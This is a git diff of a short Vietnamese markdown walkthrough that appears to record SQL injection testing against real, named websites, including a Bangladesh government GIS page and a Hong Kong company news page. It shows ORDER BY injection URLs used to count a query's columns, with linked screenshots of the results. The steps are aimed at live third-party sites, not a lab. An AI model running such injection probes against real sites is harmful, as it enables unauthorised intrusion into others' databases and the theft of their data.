@@ -1,6 +1,6 @@
 # TỔNG QUAN # 
 
-Kiểm tra trên web "BGISP" `http://www.gis.gov.bd/en/gis_file.php?id=9`
+Kiểm tra trên web "CMKOO" `[http://www.gis.gov.bd/en/gis_file.php?id=9](http://www.cmkoo.com.hk/en/news/news.php?id=28)`
 
 
 ## CÁC BƯỚC
@@ -12,15 +12,15 @@ Kiểm tra trên web "BGISP" `http://www.gis.gov.bd/en/gis_file.php?id=9`
 
 ## Dò tìm số cột
 
-http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+1
+`http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+1`
 
 ![image](https://github.com/user-attachments/assets/a84108f8-bb63-4406-97da-9aacbbc9ec96)
 
-http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+20
+`http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+20`
 
 ![image](https://github.com/user-attachments/assets/cdf0c4bd-a4b1-4b35-a12b-a3438af00070)
 
-http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+16
+`http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+16`
 
 ![image](https://github.com/user-attachments/assets/d238751e-d552-4ec0-a288-b0470fc9d980)
 
